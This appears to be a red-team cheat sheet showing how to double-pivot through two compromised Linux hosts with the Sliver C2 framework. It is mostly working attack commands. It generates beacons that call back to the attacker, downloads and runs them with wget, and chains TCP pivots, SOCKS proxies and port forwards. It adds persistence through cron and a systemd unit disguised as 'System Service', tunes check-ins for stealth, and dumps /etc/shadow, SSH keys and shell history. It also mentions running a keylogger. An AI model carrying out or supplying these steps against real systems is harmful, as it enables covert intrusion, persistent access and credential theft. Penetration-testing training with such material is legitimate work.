---
icon: skull
---

# Double-Pivot-2Time



#### Network Layout

<figure><img src="../../../.gitbook/assets/image (535).png" alt=""><figcaption></figcaption></figure>

```
Kali (Attacker)
    ↓
10.10.10.0/23 (1st Network - Direct Access)
    ↓
10.10.10.0/24 (2nd Network - Final Target)
```

***

#### **Level 0: Kali Machine Setup**

```bash
# Start Sliver server
sliver-server

# Create MTLS listener
sliver > mtls -L 0.0.0.0 -l 8888

# Verify listener is running
sliver > jobs

# Should show:
# ID  Name  Protocol  Port
# 1   mtls  tcp       8888
```

**Assuming your Kali IP:** `192.168.1.100`

***

#### **PIVOT 1: First Compromised Host (10.10.10.0/23)**

**Step 1: Generate First Beacon**

```bash
sliver > generate beacon \
    --mtls 192.168.1.100:8888 \
    --os linux \
    --arch amd64 \
    --seconds 10 \
    --jitter 3 \
    --save /tmp/beacon1.elf

# For Windows:
sliver > generate beacon \
    --mtls 192.168.1.100:8888 \
    --os windows \
    --arch amd64 \
    --format exe \
    --save /tmp/beacon1.exe
```

**What this does:** Creates a beacon that will call back to your Kali on port 8888.

***

**Step 2: Deliver to First Target**

**Option A: HTTP Server Method (Easiest)**

```bash
# On Kali
cd /tmp
python3 -m http.server 8000

# On target machine (10.10.10.5)
wget http://192.168.1.100:8000/beacon1.elf
chmod +x beacon1.elf
./beacon1.elf &
```

**Option B: If You Have SSH Access**

```bash
# From Kali
scp /tmp/beacon1.elf user@10.10.10.5:/tmp/

# SSH to target
ssh user@10.10.10.5
cd /tmp
chmod +x beacon1.elf
./beacon1.elf &
exit
```

**Option C: Exploitation Method**

```bash
# If you got initial access via exploit
# Upload beacon through your exploit payload
```

***

**Step 3: Interact with First Beacon**

```bash
# Wait for callback (about 10 seconds)
sliver > beacons

# Output example:
# ID      Name       Transport  Remote Address      Hostname  Username  OS/Arch      Last Check-in
# a1b2c3  BEACON_1   mtls       10.10.10.5:45678   host1     user1     linux/amd64  2s

# Use the beacon
sliver > use a1b2c3

# Verify you're connected
sliver (BEACON_1) > info
sliver (BEACON_1) > whoami
sliver (BEACON_1) > pwd
```

***

**Step 4: Setup First Pivot**

```bash
sliver (BEACON_1) > pivots tcp -l 9001

# Success message:
# Started tcp pivot listener on 0.0.0.0:9001

# Verify pivot is running
sliver (BEACON_1) > pivots

# Output:
# ID  Protocol  Bind Address    
# 1   tcp       0.0.0.0:9001

# Also check if port is listening
sliver (BEACON_1) > shell
netstat -tulpn | grep 9001
exit
```

**What happened?** The first compromised host (10.10.10.5) now has a TCP listener on port 9001 that will relay C2 traffic back to your Kali.

***

#### **PIVOT 2: Second Host - Final Target (10.10.10.0/24)**

**Step 1: Generate Second Beacon**

```bash
# CRITICAL: --mtls now points to the FIRST pivot host, NOT Kali!
sliver > generate beacon \
    --mtls 10.10.10.5:9001 \
    --os linux \
    --arch amd64 \
    --seconds 10 \
    --jitter 3 \
    --save /tmp/beacon2.elf

# For Windows target:
sliver > generate beacon \
    --mtls 10.10.10.5:9001 \
    --os windows \
    --arch amd64 \
    --format exe \
    --save /tmp/beacon2.exe
```

**Important:** The beacon connects to `10.10.10.5:9001`, which then relays to your Kali.

***

**Step 2: Transfer Beacon2 to Final Target**

**Method 1: Using Sliver Upload**

```bash
# Make sure you're using BEACON_1
sliver > use a1b2c3  # Your first beacon ID

# Upload beacon2 to first pivot
sliver (BEACON_1) > upload /tmp/beacon2.elf /tmp/beacon2.elf

# Verify upload
sliver (BEACON_1) > ls /tmp
```

**Method 2: Setup HTTP Server on Pivot**

```bash
# Get shell on BEACON_1
sliver (BEACON_1) > shell

# Start HTTP server
cd /tmp
python3 -m http.server 8080 &
exit

# On second target (10.10.10.20), download
wget http://10.10.10.5:8080/beacon2.elf
chmod +x beacon2.elf
./beacon2.elf &
```

**Method 3: SCP from First Pivot**

```bash
# In BEACON_1 shell
sliver (BEACON_1) > shell

# Transfer to second host
scp /tmp/beacon2.elf user@10.10.10.20:/tmp/

# SSH to second host and execute
ssh user@10.10.10.20
cd /tmp
chmod +x beacon2.elf
./beacon2.elf &
exit
exit
```

**Method 4: Direct Execution (If you have access to 2nd host)**

```bash
# If you can directly access 10.10.10.20 from BEACON_1
sliver (BEACON_1) > shell

# Execute remotely via SSH
ssh user@10.10.10.20 'wget http://10.10.10.5:8080/beacon2.elf -O /tmp/beacon2.elf && chmod +x /tmp/beacon2.elf && /tmp/beacon2.elf &'
```

***

**Step 3: Interact with Second Beacon**

```bash
# Exit BEACON_1 if you're in it
sliver (BEACON_1) > background
# or just type: back

# Check for new beacon (wait ~10 seconds)
sliver > beacons

# You should now see 2 beacons:
# ID      Name       Transport  Remote Address       Hostname  Username  OS/Arch      Last Check-in
# a1b2c3  BEACON_1   mtls       10.10.10.5:45678    host1     user1     linux/amd64  5s
# d4e5f6  BEACON_2   mtls       10.10.10.20:56789   host2     user2     linux/amd64  3s

# Use the second beacon
sliver > use d4e5f6

# Verify you're on the final target
sliver (BEACON_2) > info
sliver (BEACON_2) > whoami
sliver (BEACON_2) > ifconfig
sliver (BEACON_2) > shell
hostname
ip addr
exit
```

**Success!** You're now on the second network (10.10.10.0/24) through double pivoting!

***

### Visual Flow Diagram

```
┌─────────────────────────┐
│      Kali Linux         │
│    192.168.1.100        │
│                         │
│  MTLS Listener :8888    │
└────────────┬────────────┘
             │
             │ ① Beacon1 connects directly
             │    via MTLS
             ↓
┌─────────────────────────┐
│      Host 1             │
│     10.10.10.5          │
│                         │
│  TCP Pivot :9001 ←──────┼─── Relay Point
└────────────┬────────────┘
             │
             │ ② Beacon2 connects to
             │    10.10.10.5:9001
             │    (gets relayed to Kali)
             ↓
┌─────────────────────────┐
│    Final Target         │
│     10.10.10.20         │
│                         │
│   Your Objective! ✓     │
└─────────────────────────┘

Traffic Flow:
Kali ←→ 10.10.10.5:9001 ←→ 10.10.10.20
```

***

### Quick Cmds

#### **Complete Setup**

```bash
# ===== ON KALI =====
sliver-server
sliver > mtls -L 0.0.0.0 -l 8888

# Generate Beacon 1 (connects to Kali)
sliver > generate beacon --mtls 192.168.1.100:8888 --os linux --save /tmp/beacon1.elf

# Generate Beacon 2 (connects to first pivot)
sliver > generate beacon --mtls 10.10.10.5:9001 --os linux --save /tmp/beacon2.elf

# Serve beacons
python3 -m http.server 8000

# ===== ON FIRST TARGET (10.10.10.5) =====
wget http://192.168.1.100:8000/beacon1.elf
chmod +x beacon1.elf
./beacon1.elf &

# ===== BACK ON KALI =====
sliver > beacons
sliver > use <beacon1_id>
sliver (BEACON_1) > pivots tcp -l 9001
sliver (BEACON_1) > upload /tmp/beacon2.elf /tmp/beacon2.elf
sliver (BEACON_1) > shell
python3 -m http.server 8080 &
exit

# ===== ON SECOND TARGET (10.10.10.20) =====
wget http://10.10.10.5:8080/beacon2.elf
chmod +x beacon2.elf
./beacon2.elf &

# ===== BACK ON KALI =====
sliver > beacons
sliver > use <beacon2_id>
sliver (BEACON_2) > shell
# You're in!
```

***

### Useful Commands During Double Pivot

#### **Switch Between Beacons**

```bash
sliver > beacons                    # List all beacons
sliver > use <beacon_id>            # Switch to specific beacon
sliver (BEACON_X) > background      # Background current beacon
sliver (BEACON_X) > back            # Same as background
```

#### **Monitor Active Connections**

```bash
# View all beacons and their status
sliver > beacons

# View all active pivots
sliver > pivots

# View all jobs (listeners, servers)
sliver > jobs
```

#### **Port Forwarding Through Pivots**

```bash
# Forward SSH from final target to your Kali
sliver (BEACON_2) > portfwd add -r 10.10.10.20:22 -l 2222

# Now SSH to final target from Kali
ssh user@localhost -p 2222

# Forward RDP
sliver (BEACON_2) > portfwd add -r 10.10.10.20:3389 -l 13389
rdesktop localhost:13389

# List all port forwards
sliver (BEACON_2) > portfwd

# Remove port forward
sliver (BEACON_2) > portfwd rm <forward_id>
```

#### **SOCKS Proxy**&#x20;

```bash
# Start SOCKS5 proxy through BEACON_1
sliver (BEACON_1) > socks5 start

# Output shows:
# [*] Started SOCKS5 server on 127.0.0.1:1081

# Configure proxychains
nano /etc/proxychains4.conf
# Add at the end:
# socks5 127.0.0.1 1081

# Now use ANY tool through the pivot
proxychains nmap -sT 10.10.10.0/24
proxychains ssh user@10.10.10.20
proxychains firefox  # Browse internal network
proxychains msfconsole
```

#### **File Operations**

```bash
# Upload files
sliver (BEACON_2) > upload /local/file.txt /remote/path/file.txt

# Download files
sliver (BEACON_2) > download /remote/file.txt /local/path/

# List directory
sliver (BEACON_2) > ls /path
sliver (BEACON_2) > ls -la /path

# Change directory
sliver (BEACON_2) > cd /path

# Current directory
sliver (BEACON_2) > pwd
```

#### **Process & Execution**

```bash
# List processes
sliver (BEACON_2) > ps

# Execute command (no output)
sliver (BEACON_2) > execute /bin/bash -c "id"

# Execute with output
sliver (BEACON_2) > execute -o ls -la /tmp

# Get interactive shell
sliver (BEACON_2) > shell
```

#### **Network Recon from Beacons**

```bash
# Get network info
sliver (BEACON_2) > netstat
sliver (BEACON_2) > ifconfig

# Or use shell for more control
sliver (BEACON_2) > shell
ip addr show
ip route show
arp -a
cat /etc/hosts
cat /etc/resolv.conf
netstat -tulpn
ss -tulpn
exit
```

***

### Troubleshooting

#### **Problem: Beacon1 Not Connecting**

```bash
# Check if Kali listener is running
sliver > jobs

# Check firewall on Kali
sudo iptables -L | grep 8888
sudo ufw status

# Check beacon process on target
ps aux | grep beacon1

# Check network connectivity from target
ping 192.168.1.100
telnet 192.168.1.100 8888
```

#### **Problem: Beacon2 Not Connecting**

```bash
# Check if pivot is running on BEACON_1
sliver (BEACON_1) > pivots

# Check if port 9001 is listening on first pivot
sliver (BEACON_1) > shell
netstat -tulpn | grep 9001
ss -tulpn | grep 9001

# Check firewall on first pivot
iptables -L
exit

# Test connectivity from second target
telnet 10.10.10.5 9001
nc -zv 10.10.10.5 9001
```

#### **Problem: Slow Response Times**

```bash
# Generate beacons with faster check-in
sliver > generate beacon --mtls <ip>:port --seconds 5 --jitter 1

# Convert beacon to interactive session (faster but noisier)
sliver (BEACON_2) > interactive

# This converts asynchronous beacon to real-time session
```

#### **Problem: Pivot Lost Connection**

```bash
# Beacons auto-reconnect! Just wait
# Check beacon status
sliver > beacons

# If beacon shows as "Dead", re-upload and execute
# Beacons persist and retry connections automatically
```

#### **Problem: Can't Transfer Files**

```bash
# Method 1: Base64 encode small files
cat beacon2.elf | base64 > beacon2.b64
# Transfer text, then decode on target
base64 -d beacon2.b64 > beacon2.elf

# Method 2: Split large files
split -b 1M beacon2.elf beacon2.part
# Transfer parts, then combine
cat beacon2.part* > beacon2.elf

# Method 3: Use Sliver's built-in upload (most reliable)
sliver (BEACON_1) > upload /tmp/beacon2.elf /tmp/beacon2.elf
```

***

### Advanced Techniques

#### **Persistence on Pivots**

```bash
# Cron job (Linux)
sliver (BEACON_1) > shell
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/beacon1.elf") | crontab -
exit

# Systemd service
sliver (BEACON_1) > shell
cat > /tmp/beacon.service << EOF
[Unit]
Description=System Service
After=network.target

[Service]
ExecStart=/tmp/beacon1.elf
Restart=always

[Install]
WantedBy=multi-user.target
EOF
sudo cp /tmp/beacon.service /etc/systemd/system/
sudo systemctl enable beacon
sudo systemctl start beacon
exit
```

#### **Stealth Configuration**

```bash
# Long check-in intervals (less network traffic)
sliver > generate beacon \
    --mtls <ip>:port \
    --seconds 300 \
    --jitter 120 \
    --skip-symbols \
    --save beacon.elf

# This checks in every 5-8 minutes
```

#### **Using HTTPS Instead of MTLS**

```bash
# On Kali
sliver > https -L 0.0.0.0 -l 443

# Generate with HTTPS (blends with normal web traffic)
sliver > generate beacon --http 192.168.1.100:443 --save beacon1.elf

# For pivot, use TCP pivot (HTTPS listener not needed on pivots)
```

#### **Multiple Beacons on Same Host**

```bash
# Generate multiple beacons with different configs
sliver > generate beacon --mtls 192.168.1.100:8888 --seconds 10 --save fast.elf
sliver > generate beacon --mtls 192.168.1.100:8888 --seconds 300 --save slow.elf

# Deploy both for redundancy
```

***

### Post-Exploitation on Final Target

Once you have access to BEACON\_2:

```bash
# Get system info
sliver (BEACON_2) > info
sliver (BEACON_2) > shell
uname -a
cat /etc/os-release
whoami
id
groups

# Privilege escalation check
sudo -l
find / -perm -4000 2>/dev/null  # SUID binaries
getcap -r / 2>/dev/null

# Network enumeration
ip addr
ip route
arp -a
cat /etc/hosts

# Find interesting files
find / -name "*password*" 2>/dev/null
find / -name "*config*" 2>/dev/null
ls -la ~/.ssh
cat ~/.bash_history

# Dump credentials
cat /etc/passwd
cat /etc/shadow  # if root
exit

# Dump processes
sliver (BEACON_2) > ps

# Screenshot (if GUI available)
sliver (BEACON_2) > screenshot

# Keylogger (if needed)
sliver (BEACON_2) > execute -o /path/to/keylogger
```

***
